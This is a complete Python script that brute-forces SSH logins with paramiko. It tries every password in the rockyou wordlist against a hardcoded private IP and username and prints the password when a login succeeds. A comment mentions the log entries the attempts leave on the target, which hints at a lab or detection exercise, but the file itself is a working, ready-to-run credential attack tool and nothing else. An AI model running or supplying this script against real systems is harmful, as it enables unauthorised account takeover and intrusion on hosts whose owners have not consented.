import paramiko
import time

def ssh_dict_attack(target_ip, username, wordlist_path):
    print(f"[*] Starting attack on {target_ip} for user '{username}'...")
    
    # Initialize the SSH client
    client = paramiko.SSHClient()
    # Automatically accept the host key (required for an automated script)
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    attempts = 0
    start_time = time.time()
    
    try:
        # Open the wordlist (e.g., rockyou.txt)
        with open(wordlist_path, 'r', encoding='utf-8') as file:
            for line in file:
                attempts += 1
                password = line.strip()
                
                try:
                    # Network connection attempt to the SSH service (default port 22)
                    print(f"[*] Attempt {attempts}: {password}")

                    client.connect(target_ip, username=username, password=password, timeout=3, look_for_keys=False, allow_agent=False)
                    elapsed_time = time.time() - start_time
                    print(f"[+] Success! Password found: '{password}'")
                    print(f"[+] Attempts: {attempts}")
                    print(f"[+] Elapsed time: {elapsed_time:.2f} seconds")
                    
                    client.close()
                    return True
                    
                except paramiko.AuthenticationException:
                    # Authentication failed (This is what generates the log on the target)
                    pass
                except Exception as e:
                    print(f"[-] Network error with {target_ip}: {e}")
                    break
                    
    except FileNotFoundError:
        print(f"[-] Error: Dictionary file '{wordlist_path}' not found.")
        return False
        
    print("[-] Attack completed. Password not found in the wordlist.")
    return False

if __name__ == "__main__":
    # Network attack parameters
    TARGET_IP = "192.168.122.72"
    USERNAME = "yassine"
    DICTIONARY = "/usr/share/wordlists/rockyou.txt"
    
    ssh_dict_attack(TARGET_IP, USERNAME, DICTIONARY)
